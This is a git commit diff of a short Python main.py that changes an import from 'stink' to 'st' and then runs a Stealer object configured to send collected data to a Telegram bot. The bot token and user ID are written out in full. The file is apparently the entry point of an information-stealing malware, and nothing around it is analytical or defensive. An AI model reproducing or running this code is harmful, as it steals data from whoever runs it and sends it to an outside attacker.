b7872b5a39a46f8285754abacfc89babacb30189
DGaliaf <danilhodos@MacBook-Air-Danil-2.local>
2025-02-18 13:38:00 +1000

    g

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-from stink import Stealer, Senders
-
+from st import Stealer, Senders
+# 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", user_id=586901167)]).run()
